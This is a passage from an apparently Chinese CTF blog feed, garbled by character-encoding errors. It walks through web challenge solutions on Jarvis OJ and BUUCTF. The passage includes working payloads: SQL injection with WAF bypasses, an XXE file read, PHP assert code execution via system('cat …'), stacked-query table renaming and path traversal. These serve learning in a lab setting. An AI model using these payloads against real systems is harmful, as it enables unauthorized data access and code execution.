class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>å¯ä»¥çœ‹åˆ°ä¸»è¦å°±æ˜¯é‚£ä¸€å±‚if</p>\n<ol>\n<li>$dataç”¨php://inputä¼ è¿›å»</li>\n<li>id=0</li>\n<li>bé•¿åº¦è¦å¤§äº5ä½†æ˜¯è¦æ»¡è¶³ç¬¬äºŒã€ä¸‰å±‚è¦é•¿åº¦ä¸º0ï¼Œè¿™æ—¶å€™å°±è¦è®©b=%0011111ï¼Œstrlenä¸ä¼šè¢«æˆªæ–­ï¼Œsubsträ¼šè¢«æˆªæ–­</li>\n<li>ç„¶åè®©æˆ‘ä»¬è®¿é—®<a href=\"http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1%EF%BC%8C%E5%8F%88%E7%9C%8B%E5%88%B0%E4%BA%86id=1%EF%BC%8C%E6%9C%89%E5%8F%AF%E8%83%BD%E6%98%AF%E6%B3%A8%E5%85%A5\">http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1ï¼Œåˆçœ‹åˆ°äº†id=1ï¼Œæœ‰å¯èƒ½æ˜¯æ³¨å…¥</a></li>\n<li>ç”¨å•å¼•å·æµ‹è¯•å‘ç°ç›´æ¥è¿”å›äº†sqlè¯­å¥ï¼Œé‚£çœ‹æ¥åº”è¯¥å°±æ˜¯sqlæ³¨å…¥äº†</li>\n<li>æµ‹è¯•å‘ç°è¿‡æ»¤äº†ç©ºæ ¼è¿™ä¸ªå¯ä»¥ç”¨æ³¨é‡Šç¬¦/**/ç»•è¿‡ï¼Œä½†æ˜¯å‘ç°ç›´æ¥ç”¨ä¼šè¢«è¿‡æ»¤ï¼Œè¯•ç€å¾€é‡Œé¢åŠ ç‚¹ä¸œè¥¿å°±å¥½äº†</li>\n<li>ç”¨<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#</code>æµ‹è¯•å¾—åˆ°å­—æ®µæ•°ä¸º3</li>\n<li>ç”¨<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,database()/*1*/#</code>æ‹¿åˆ°æ•°æ®åº“åæ˜¯test</li>\n<li>ç”¨<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,table_name/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374#</code>æ‹¿åˆ°è¡¨åcontent</li>\n<li>ç”¨<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74#</code>å¾—åˆ°å­—æ®µåæ˜¯id,context,title</li>\n<li>ç”¨<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(context)/*1*/frofromm/*1*/content#</code>æ‹¿åˆ°flag</li>\n</ol>\n<h2 id=\"apiè°ƒç”¨\"><a href=\"#apiè°ƒç”¨\" class=\"headerlink\" title=\"apiè°ƒç”¨\"></a>apiè°ƒç”¨</h2><p>ç”±äºé»˜è®¤ä¼ è¾“æ˜¯jsonæ ¼å¼ï¼Œå…ˆæŠ“åŒ…æŠŠæ ¼å¼æ”¹æˆxmlï¼Œç„¶åä¼ payload<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;  &lt;!DOCTYPE foo [  &lt;!ENTITY myentity SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;  &lt;abc&gt;&amp;myentity;&lt;/abc&gt;</code>å°±æ‹¿åˆ°äº†flag</p>\n<h2 id=\"WEBï¼Ÿ\"><a href=\"#WEBï¼Ÿ\" class=\"headerlink\" title=\"WEBï¼Ÿ\"></a>WEBï¼Ÿ</h2><p>ä¸€å¼€å§‹è¿˜çœ‹ä¸æ‡‚é¢˜ç›®è¦å¹²å˜›ï¼Œç„¶åæŸ¥çœ‹æºä»£ç çœ‹åˆ°ä¸€å †Jsï¼Œç„¶åç”¨è°·æ­Œæ’ä»¶ç¾åŒ–ä¸€ä¸‹ï¼ˆå®‰åˆ©ä¸€ä¸‹JavaScript and CSS Code Beautifierï¼‰ï¼Œæ–¹ä¾¿çœ‹ä»£ç ã€‚ç„¶åå‘ç°æœ‰ä¸¤ä¸‡è¡Œçš„ä»£ç ã€‚ã€‚ã€‚ã€‚çœ‹WPçŸ¥é“äº†ç”¨passwordå…³é”®è¯æ¥å¼€å§‹å®¡è®¡ã€‚å¤§æ¦‚å°±æ˜¯çŸ©é˜µA*B=C,å·²çŸ¥Bï¼ŒCæ±‚Aã€‚ï¼ˆçº¿ä»£çŸ¥è¯†æ—©å°±å¿˜å¾—å·®ä¸å¤šäº†ï¼‰</p>\n<h2 id=\"babyphp\"><a href=\"#babyphp\" class=\"headerlink\" title=\"babyphp\"></a>babyphp</h2><p>æ”»é˜²ä¸–ç•ŒåŸé¢˜ï¼Œå…ˆæ˜¯githackæ‹¿åˆ°æºç ï¼Œç„¶åassertä»»æ„ä»£ç æ‰§è¡Œæ‹¿åˆ°flagï¼Œç”¨â€™)é—­åˆç„¶åä»»æ„æ‰§è¡Œä»£ç <br>payloadï¼š<code>?page=2&#39;) or system(&quot;cat templates/flag.php&quot;);//</code></p>\n<h2 id=\"inject\"><a href=\"#inject\" class=\"headerlink\" title=\"inject\"></a>inject</h2><p>æç¤ºè¯´å…ˆæ‹¿åˆ°æºç å†è¯´ï¼Œçœ‹äº†WPçŸ¥é“è¦è¯•å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åï¼Œå¸¸è§çš„å¤‡ä»½æ–‡ä»¶ä¸´æ—¶æ–‡ä»¶åï¼Œæ¯”å¦‚.bakã€.swpã€.saveã€<del>ç­‰ï¼Œç„¶åè¿™ä¸€é¢˜æ˜¯åœ¨index.php</del>â€¦..æ‹¿åˆ°æºç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-keyword\">require</span>(<span class=\"hljs-string\">&quot;config.php&quot;</span>);<br><span class=\"hljs-variable\">$table</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;table&#x27;</span>]?<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;table&#x27;</span>]:<span class=\"hljs-string\">&quot;test&quot;</span>;<br><span class=\"hljs-variable\">$table</span> = Filter(<span class=\"hljs-variable\">$table</span>);<br>mysqli_query(<span class=\"hljs-variable\">$mysqli</span>,<span class=\"hljs-string\">&quot;desc `secret_<span class=\"hljs-subst\">&#123;$table&#125;</span>`&quot;</span>) <span class=\"hljs-keyword\">or</span> Hacker();<br><span class=\"hljs-variable\">$sql</span> = <span class=\"hljs-string\">&quot;select &#x27;flag&#123;xxx&#125;&#x27; from secret_<span class=\"hljs-subst\">&#123;$table&#125;</span>&quot;</span>;<br><span class=\"hljs-variable\">$ret</span> = sql_query(<span class=\"hljs-variable\">$sql</span>);<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$ret</span>[<span class=\"hljs-number\">0</span>];<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>åº”è¯¥æ˜¯sqlæ³¨å…¥çš„é¢˜ç›®ï¼Œå…ˆæ˜¯è¦æˆåŠŸæ‰§è¡Œdesc <code>secret_&#123;$table&#125;</code>ï¼Œç„¶ååˆ©ç”¨ä¸‹é¢çš„sqlè¯­å¥æ‹¿åˆ°flagã€‚desc table_nameéœ€è¦è¡¨å­˜åœ¨ï¼Œè¿™æ ·å°±é™åˆ¶äº†æ³¨å…¥ï¼Œå› æ­¤åº”è¯¥å°±æ˜¯è¦åœ¨è¿™é‡Œä¸‹åŠŸå¤«ã€‚<br>å› ä¸ºdesc <code>test</code> <code>aaa</code>,åªè¦ç¬¬ä¸€ä¸ªè¡¨å­˜åœ¨å°±ä¼šæ‰§è¡Œï¼Œä½†æ˜¯å¦‚æœæ˜¯å•å¼•å·å°±ä¸ä¼šæ‰§è¡Œï¼Œè¿™ä¸€è¦è€ƒæ ¸çš„åº”è¯¥å°±æ˜¯è¿™ä¸ªç‚¹ã€‚ç„¶åå°±å¯ä»¥æ„é€ payloadï¼šâ€?table=test<code> </code>union select database() limit 1,1â€æ‹¿åˆ°æ•°æ®åº“å61d300ï¼Œæ³¨æ„è¦åŠ limitï¼Œä¸ç„¶ç›´ä¼šè¿”å›Dã€‚ç„¶åæ„é€ payloadï¼šâ€œ?table=test<code> </code>union select table_name from information_schema.tables where table_schema=0x363164333030 limit 1,1â€ï¼Œæ‹¿åˆ°è¡¨åsecret_flagï¼Œæ³¨æ„ç”¨åå…­è¿›åˆ¶è¿‡wafã€‚åŒæ ·åŠæ³•æ‹¿åˆ°åˆ—åflagUwillNeverKnowï¼Œç„¶åæ‹¿åˆ°flagï¼šflag{luckyGame~}</p>\n<h2 id=\"phpinfo\"><a href=\"#phpinfo\" class=\"headerlink\" title=\"phpinfo\"></a>phpinfo</h2><p>sessionçš„åºåˆ—åŒ–æ–¹æ³•ä¸åŒå¯¼è‡´çš„æ¼æ´ï¼Œè¿˜æœ‰å°±æ˜¯å¦‚ä½•å¾€sessioné‡ŒåŠ å…¥payload</p>\n<h2 id=\"REï¼Ÿ\"><a href=\"#REï¼Ÿ\" class=\"headerlink\" title=\"REï¼Ÿ\"></a>REï¼Ÿ</h2><p>ä¸‹è½½äº†ä¸ªudf.soæ–‡ä»¶ï¼Œä¸çŸ¥é“è¿™æ˜¯å•¥å°±ä¸Šç½‘æœäº†ä¸€ä¸‹ï¼Œ<a href=\"https://www.cnblogs.com/sijidou/p/10522972.html\">https://www.cnblogs.com/sijidou/p/10522972.html</a></p>\n<h2 id=\"flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ\"><a href=\"#flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ\" class=\"headerlink\" title=\"flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ\"></a>flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ</h2><p>å…ˆæŠ“ä¸ªåŒ…ï¼Œçœ‹åˆ°cookieé‡Œæœ‰ä¸€ä¸ªadmin=0ï¼Œæ”¹æˆ1ä¸è¡Œï¼Œè¿˜æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œurlè§£ç ä»¥åå‘ç°æ˜¯s:5:â€guestâ€;è¯•ä¸€ä¸‹æ”¹æˆadminå¾ˆæ˜¾ç„¶ä¹Ÿæ˜¯ä¸è¡Œçš„ï¼Œè¿˜æœ‰å°±æ˜¯ä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œä¼°è®¡ç›´æ¥çˆ†ç ´ä¹Ÿæ˜¯ä¸è¡Œçš„ï¼Œåˆ°è¿™é‡Œå°±æ–­äº†æ€è·¯ã€‚ç„¶åçœ‹WPè¯´æ‰¾æºç ï¼Œä¸€æ ·çš„index.php~æ‹¿åˆ°ä¸€ä¸ªå®è´¨ä¸º.swpçš„vimå¼‚å¸¸é€€å‡ºæ–‡ä»¶ï¼Œç„¶åå°±åˆ†æä¸€ä¸‹æºç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <br>\t<span class=\"hljs-variable\">$auth</span> = <span class=\"hljs-literal\">false</span>;<br>\t<span class=\"hljs-variable\">$role</span> = <span class=\"hljs-string\">&quot;guest&quot;</span>;<br>\t<span class=\"hljs-variable\">$salt</span> = <br>\t<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;role&quot;</span>])) &#123;<br>\t    <span class=\"hljs-variable\">$role</span> = unserialize(<span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;role&quot;</span>]);<br>\t    <span class=\"hljs-variable\">$hsh</span> = <span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;hsh&quot;</span>];<br>\t    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$role</span>===<span class=\"hljs-string\">&quot;admin&quot;</span> &amp;&amp; <span class=\"hljs-variable\">$hsh</span> === md5(<span class=\"hljs-variable\">$salt</span>.strrev(<span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;role&quot;</span>]))) &#123;<br>\t        <span class=\"hljs-variable\">$auth</span> = <span class=\"hljs-literal\">true</span>;<br>\t    &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>\t        <span class=\"hljs-variable\">$auth</span> = <span class=\"hljs-literal\">false</span>;<br>\t    &#125;<br>\t&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>\t    <span class=\"hljs-variable\">$s</span> = serialize(<span class=\"hljs-variable\">$role</span>);<br>\t    setcookie(<span class=\"hljs-string\">&#x27;role&#x27;</span>,<span class=\"hljs-variable\">$s</span>);<br>\t    <span class=\"hljs-variable\">$hsh</span> = md5(<span class=\"hljs-variable\">$salt</span>.strrev(<span class=\"hljs-variable\">$s</span>));<br>\t    setcookie(<span class=\"hljs-string\">&#x27;hsh&#x27;</span>,<span class=\"hljs-variable\">$hsh</span>);<br>\t&#125;<br>\t<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$auth</span>) &#123;<br>\t    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;h3&gt;Welcome Admin. Your flag is </span><br><span class=\"hljs-string\">\t&#125; else &#123;</span><br><span class=\"hljs-string\">\t    echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class=\"hljs-string\">&quot;;</span><br><span class=\"hljs-string\">\t&#125;</span><br><span class=\"hljs-string\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>å¯ä»¥çœ‹åˆ°å“ˆå¸Œå€¼æ˜¯md5(salt+åå‘â€œadminâ€)ï¼›åº”è¯¥æ˜¯å“ˆå¸Œçš„æŸç§æ”»å‡»æ–¹æ³•ã€‚äº†è§£åˆ°åº”è¯¥å¯ä»¥è¿›è¡Œå“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ã€‚<br>ï¼ˆå‚è€ƒ<a href=\"https://www.cnblogs.com/pcat/p/5478509.html%EF%BC%89\">https://www.cnblogs.com/pcat/p/5478509.htmlï¼‰</a><br>PCTF{H45h_ext3ndeR_i5_easy_to_us3}</p>\n<h2 id=\"Chopper\"><a href=\"#Chopper\" class=\"headerlink\" title=\"Chopper\"></a>Chopper</h2><p>è¿›å…¥ç®¡ç†å‘˜ç™»é™†ç•Œé¢ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°â€œadmin ip is 202.5.19.128â€ï¼›</p>\n<h2 id=\"Simple-Injection\"><a href=\"#Simple-Injection\" class=\"headerlink\" title=\"Simple Injection\"></a>Simple Injection</h2><p>å‘ç°å½“è¾“å…¥çš„è´¦å·æ˜¯adminçš„æ—¶å€™å›æ˜¾æ˜¯å¯†ç é”™è¯¯ï¼Œè¾“å…¥å…¶ä»–è´¦æˆ·çš„æ—¶å€™å›æ˜¾æ˜¯å¯†ç é”™è¯¯ã€‚å½“è´¦æˆ·åç”¨adminâ€™ #å‘ç°å¯ä»¥ä½†æ˜¯ç”¨adminâ€™ and 1=1 #æ—¶è¢«è¿‡æ»¤äº†ï¼Œå†è¯•ä¸€ä¸‹<code>admin&#39;/**/and/**/</code>å‘ç°æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ ¹æ®å›æ˜¾å¯ä»¥å°è¯•boolç›²æ³¨æˆ–è€…æ—¶é—´ç›²æ³¨ã€‚<br>ä¸è¿‡çœ‹äº†WPæ‰å‘ç°è¿˜æœ‰ä¸€ç§æ›´ç®€å•çš„æ–¹æ³•<br>ç›´æ¥ç”¨payload<code>username=miracle778&#39;/**/union(select(md5(&#39;123&#39;)))#&amp;password=123</code>å°±èƒ½æ‹¿åˆ°flag</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/11/20/BUUCTF-WP/",
            "url": "http://blog.m1n.me/2019/11/20/BUUCTF-WP/",
            "title": "BUUCTF-WP",
            "date_published": "2019-11-20T14:49:13.000Z",
            "content_html": "<p>BUUCTFéƒ¨åˆ†é¢˜è§£<br>OJé“¾æ¥<a href=\"https://buuoj.cn/challenges\">https://buuoj.cn/challenges</a></p>\n<span id=\"more\"></span>\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"HCTF-2018-WarmUp\"><a href=\"#HCTF-2018-WarmUp\" class=\"headerlink\" title=\"[HCTF 2018]WarmUp\"></a>[HCTF 2018]WarmUp</h2><ol>\n<li>å…ˆæŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°source.phpï¼Œå°±è¯»åˆ°äº†æºç ï¼Œç„¶åè¿˜æœ‰ä¸€ä¸ªhint.phpå¯ä»¥çœ‹åˆ°flagåœ¨ffffllllaaaagggg</li>\n<li>åˆ†æä¸€ä¸‹æºç ï¼š<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autoit\">$_page = mb_substr(<br>                $page,<br>                <span class=\"hljs-number\">0</span>,<br>                mb_strpos($page . <span class=\"hljs-string\">&#x27;?&#x27;</span>, <span class=\"hljs-string\">&#x27;?&#x27;</span>)<br>            )<span class=\"hljs-comment\">;</span><br></code></pre></td></tr></table></figure>\nå¯ä»¥çœ‹åˆ°å®ƒæ˜¯æ ¹æ®?çš„ä½ç½®æ¥æˆªå–ï¼Œå› æ­¤å¯ä»¥æ„é€ paylaodï¼š<code>?file=hint.php?../../../../../../../ffffllllaaaagggg</code>å°±è¯»åˆ°äº†flag<h2 id=\"å¼ºç½‘æ¯-2019-éšä¾¿æ³¨\"><a href=\"#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨\" class=\"headerlink\" title=\"[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨\"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2></li>\n<li>å…ˆç”¨å•å¼•å·é—­åˆï¼Œå‘ç°æŠ¥é”™ï¼Œç„¶åç”¨order byæµ‹è¯•å‡ºå­—æ®µæ•°ä¸º2ï¼Œå†å°è¯•unionæ³¨å…¥å‘ç°è¿‡æ»¤ï¼š<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);</code></li>\n<li>payload:<code>1&#39;;show databases #</code>æ‹¿åˆ°æ•°æ®åº“å<br>array(1) {<br> [0]=&gt;<br> string(11) â€œctftrainingâ€<br>}</li>\n</ol>\n<p>array(1) {<br>  [0]=&gt;<br>  string(18) â€œinformation_schemaâ€<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(5) â€œmysqlâ€<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(18) â€œperformance_schemaâ€<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(9) â€œsupersqliâ€<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(4) â€œtestâ€<br>}<br>3. <code>1&#39;; show tables from ctftraining #</code>æ‹¿åˆ°è¡¨å<br>array(1) {<br>    [0]=&gt;<br>    string(10) â€œFLAG_TABLEâ€<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(4) â€œnewsâ€<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(5) â€œusersâ€<br>}<br>4. <code>1&#39;;show columns from ctftraining.FLAG_TABLE #</code>å‘ç°ä¸è¡Œï¼Œè¢«è¿‡æ»¤äº†ï¼Ÿï¼Ÿ<br>5. <code>1&#39;;show tables #</code>çœ‹åˆ°æœ‰ä¸¤ä¸ªè¡¨</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(16) â€œ1919810931114514â€<br>}</p>\n<p>array(1) {<br>  [0]=&gt;<br>  string(5) â€œwordsâ€<br>}<br>6. åˆ†åˆ«æŸ¥çœ‹wordså’Œ1919810931114514é‡Œé¢æœ‰äº›ä»€ä¹ˆ  </p>\n<p> <code>1&#39;;show columns from words #</code>:array(6) {<br>  [0]=&gt;<br>  string(2) â€œidâ€<br>  [1]=&gt;<br>  string(7) â€œint(10)â€<br>  [2]=&gt;<br>  string(2) â€œNOâ€<br>  [3]=&gt;<br>  string(0) â€œâ€<br>  [4]=&gt;<br>  NULL<br>  [5]=&gt;<br>  string(0) â€œâ€<br>}</p>\n<p>array(6) {<br>  [0]=&gt;<br>  string(4) â€œdataâ€<br>  [1]=&gt;<br>  string(11) â€œvarchar(20)â€<br>  [2]=&gt;<br>  string(2) â€œNOâ€<br>  [3]=&gt;<br>  string(0) â€œâ€<br>  [4]=&gt;<br>  NULL<br>  [5]=&gt;<br>  string(0) â€œâ€<br>}<br><code>1&#39;;show columns from </code>1919810931114514<code> #</code>ï¼ˆæ³¨æ„è¿™é‡Œè¦åŠ åå¼•å·ï¼‰ï¼šarray(6) {<br>  [0]=&gt;<br>  string(4) â€œflagâ€<br>  [1]=&gt;<br>  string(12) â€œvarchar(100)â€<br>  [2]=&gt;<br>  string(2) â€œNOâ€<br>  [3]=&gt;<br>  string(0) â€œâ€<br>  [4]=&gt;<br>  NULL<br>  [5]=&gt;<br>  string(0) â€œâ€<br>}çœ‹åˆ°äº†æœ‰flag<br>7. æ¥ä¸‹æ¥æ€ä¹ˆè¯»åˆ°flagå°±æ˜¯å…³é”®äº†</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-number\">1</span>&#x27;; alter table <span class=\"hljs-built_in\">words</span> rename <span class=\"hljs-keyword\">to</span> words1;alter table `<span class=\"hljs-number\">1919810931114514</span>` rename <span class=\"hljs-keyword\">to</span> <span class=\"hljs-built_in\">words</span>;alter table <span class=\"hljs-built_in\">words</span> change flag <span class=\"hljs-built_in\">id</span> varchar(<span class=\"hljs-number\">50</span>);<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-number\">1</span>&#x27;; alter table <span class=\"hljs-built_in\">words</span> rename <span class=\"hljs-keyword\">to</span> words1;alter table `<span class=\"hljs-number\">1919810931114514</span>` rename <span class=\"hljs-keyword\">to</span> <span class=\"hljs-built_in\">words</span>;alter table <span class=\"hljs-built_in\">words</span> add <span class=\"hljs-built_in\">id</span> int;a;ter table <span class=\"hljs-built_in\">words</span> alter <span class=\"hljs-built_in\">id</span> <span class=\"hljs-keyword\">set</span> default <span class=\"hljs-number\">1</span>;<br></code></pre></td></tr></table></figure>\n\n<p>ç„¶åç”¨<code>1&#39;or 1=1 #</code>æ‹¿åˆ°flag</p>\n<p>å¦payloadï¼š</p>\n<figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs smali\">1&#x27;;<br>SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;<br>prepare execsql from @a;<span class=\"hljs-built_in\"></span><br><span class=\"hljs-built_in\">execute </span>execsql;<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"æŠ¤ç½‘æ¯-2018-easy-tornado\"><a href=\"#æŠ¤ç½‘æ¯-2018-easy-tornado\" class=\"headerlink\" title=\"[æŠ¤ç½‘æ¯ 2018]easy_tornado\"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>SSTIï¼Œhandler.settingsæ‹¿secret-cookie</p>\n<h2 id=\"æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL\"><a href=\"#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL\" class=\"headerlink\" title=\"[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p>ä¸‡èƒ½å¯†ç ç›´æ¥æ‹¿flag</p>\n<h2 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h2><p>æŸ¥çœ‹æºä»£ç å‘ç°/calc.php?num=ï¼Œè®¿é—®calc.phpæ‹¿åˆ°æºç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>error_reporting(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-variable\">$str</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>];<br>        <span class=\"hljs-variable\">$blacklist</span> = [<span class=\"hljs-string\">&#x27; &#x27;</span>, <span class=\"hljs-string\">&#x27;\\t&#x27;</span>, <span class=\"hljs-string\">&#x27;\\r&#x27;</span>, <span class=\"hljs-string\">&#x27;\\n&#x27;</span>,<span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"hljs-string\">&#x27;&quot;&#x27;</span>, <span class=\"hljs-string\">&#x27;`&#x27;</span>, <span class=\"hljs-string\">&#x27;\\[&#x27;</span>, <span class=\"hljs-string\">&#x27;\\]&#x27;</span>,<span class=\"hljs-string\">&#x27;\\$&#x27;</span>,<span class=\"hljs-string\">&#x27;\\\\&#x27;</span>,<span class=\"hljs-string\">&#x27;\\^&#x27;</span>];<br>        <span class=\"hljs-keyword\">foreach</span> (<span class=\"hljs-variable\">$blacklist</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$blackitem</span>) &#123;<br>                <span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">&#x27;/&#x27;</span> . <span class=\"hljs-variable\">$blackitem</span> . <span class=\"hljs-string\">&#x27;/m&#x27;</span>, <span class=\"hljs-variable\">$str</span>)) &#123;<br>                        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">&#x27;echo &#x27;</span>.<span class=\"hljs-variable\">$str</span>.<span class=\"hljs-string\">&#x27;;&#x27;</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span> <br></code></pre></td></tr></table></figure>\n\n<p>phpçš„è§£æè§„åˆ™ï¼Œå½“phpè¿›è¡Œè§£æçš„æ—¶å€™ï¼Œå¦‚æœå˜é‡å‰é¢æœ‰ç©ºæ ¼ï¼Œä¼šå»æ‰å‰é¢çš„ç©ºæ ¼å†è§£æ,ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦ç”¨<code>? num=</code>å°±å¯ä»¥ç»•è¿‡wafçš„æ£€æµ‹ï¼Œä½†æ˜¯è¿™æ 